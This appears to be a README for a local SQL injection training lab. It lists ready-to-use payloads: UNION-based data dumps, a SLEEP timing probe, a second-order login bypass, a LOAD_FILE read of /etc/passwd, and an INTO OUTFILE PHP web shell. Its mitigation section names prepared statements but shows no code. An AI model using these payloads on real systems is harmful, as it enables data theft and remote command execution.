# Advanced-SQL-Injection-Lab
A hands-on lab exploring advanced SQL injection techniques (Error-based, Time-blind, and Second-order) including exploitation and secure mitigation strategies.


📌 Project Overview
This repository contains a hands-on cybersecurity lab exploring advanced SQL Injection (SQLi) techniques. The project demonstrates how vulnerabilities are exploited in a PHP/MySQL environment and provides secure coding solutions to mitigate these risks.

🏗️ Lab Environment
Language: PHP

Database: MySQL (vulnerable_db)

Server: XAMPP / LAMP Stack

Platform: Developed and tested on Kali Linux

🚩 Phase 1: Exploitation Walkthrough
1. Error-Based SQL Injection
Target: search.php

Objective: Force the database to leak metadata through the UI.

Payloads:

Retrieve Version: ' UNION SELECT NULL, version(), NULL #

Retrieve DB Name: ' UNION SELECT NULL, database(), NULL #

List Tables: ' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = 'vulnerable_db' #

2. Time-Based Blind SQL Injection
Target: login.php

Objective: Confirm vulnerability by inducing a time delay.

Payload: admin' AND SLEEP(5) #

Result: The application pauses for 5 seconds before responding, indicating successful injection.

3. Second-Order SQL Injection
Target: register.php (Entry) & login.php (Execution)

Objective: Inject a payload that is stored in the database and executed during a later session.

Payload: admin'--

4. Advanced File Operations
Read System Files: ' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL #

RCE (Web Shell): ' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/opt/lampp/htdocs/shell.php' #

🛡️ Phase 2: Mitigation & Secure Coding
The primary defense against SQL Injection is the use of Prepared Statements (Parameterized Queries).

Vulnerable Code Example
Secure Code Example (The Fix)

⚖️ Ethical Disclaimer
This lab is for educational and ethical hacking purposes only. All testing was performed in a controlled local environment.
